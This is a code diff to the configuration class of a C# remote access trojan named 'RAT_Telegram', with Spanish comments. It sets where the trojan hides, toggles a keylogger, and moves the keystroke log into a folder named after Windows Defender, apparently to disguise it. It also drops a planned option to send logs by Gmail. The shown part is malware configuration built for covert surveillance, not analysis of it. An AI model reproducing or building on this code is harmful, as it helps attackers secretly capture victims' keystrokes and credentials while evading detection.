@@ -22,13 +22,11 @@
         public const string PATH_OCUL = @"C:\Users\Public\RAT_Telegram";      // Ruta donde se esconde //@"C:\Users\Public\Public Config\Windows\Security\RAT_Telegram"
 
         //Config Keylogger 
-        public const bool   KEYLOGGER   = true;                             // True = Keylogger activo  // False = Keylogger deshabilitado
-        public const string PATH_LOG    = @"C:\Users\Public\RAT_Telegram";  // Ruta donde se guardará el registro de teclas
-        public const string LOG         = "reg.k";                          //Archivo registro.
-        public const bool   SEND_GMAIL  = false;                            // Futura actualización                     
-        //public const string SEND_Gmail = "";
-        //public const string  = "";
-        //public const string  = "";
+        public const bool   KEYLOGGER   = false;                             // True = Keylogger activo  // False = Keylogger deshabilitado
+        public const string PATH_LOG    = @"C:\Users\Public\Security\Windows Defender";  // Ruta donde se guardará el registro de teclas
+        public const string LOG         = "reg.k";                          //Archivo registro.                   
+        public const string PATH_KEY    = PATH_LOG+ @"\"+LOG;
+
 
 
     }
